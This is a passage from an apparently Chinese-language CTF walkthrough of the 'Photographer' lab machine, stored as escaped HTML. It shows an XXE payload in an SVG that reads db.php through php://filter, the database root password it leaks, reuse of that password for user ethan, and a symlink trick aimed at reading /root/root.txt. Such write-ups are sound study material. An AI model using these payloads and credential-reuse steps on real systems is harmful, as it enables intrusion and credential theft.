#x3C;!ENTITY test SYSTEM \u003cspan class=\"hljs-string\"\u003e'php://filter/read=convert.base64-encode/resource=db.php'\u003c/span\u003e\u003e]\u003e\u0026#x3C;svg\u003e\u0026#x26;test;\u0026#x3C;/svg\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsPhotographer/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u0026#x3C;?php\n$host = \u003cspan class=\"hljs-string\"\u003e\"localhost\"\u003c/span\u003e;\n$db = \u003cspan class=\"hljs-string\"\u003e\"blog\"\u003c/span\u003e;\n$user = \u003cspan class=\"hljs-string\"\u003e\"root\"\u003c/span\u003e;\n$\u003cspan class=\"hljs-keyword\"\u003epass\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\"pjtF0533OPiSMQTGZacZY6jy$\"\u003c/span\u003e;\n\n$conn = new mysqli($host, $user, $\u003cspan class=\"hljs-keyword\"\u003epass\u003c/span\u003e, $db);\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ($conn-\u003econnect_error) {\n    die(\u003cspan class=\"hljs-string\"\u003e\"Conexión fallida: \"\u003c/span\u003e . $conn-\u003econnect_error);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e拿到数据库账号密码 \u003ccode\u003eroot\u003c/code\u003e:\u003ccode\u003epjtF0533OPiSMQTGZacZY6jy$\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e密码碰撞，该密码是用户 \u003ccode\u003eethan\u003c/code\u003e 的密码\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsPhotographer/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003ch3\u003e错误的尝试\u003c/h3\u003e\n\u003cp\u003e本来想到一个直接读 \u003ccode\u003eroot.txt\u003c/code\u003e 的方法的，如下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e// 靶机\nethan@photographer:~$ rm creds.txt \nrm: ¿borrar el fichero regular \u003cspan class=\"hljs-string\"\u003e'creds.txt'\u003c/span\u003e  protegido contra escritura? (s/n) s\n\nethan@photographer:~$ ln -s /root/root.txt creds.txt\n\n// Kali\n➜  Photographer snmpwalk
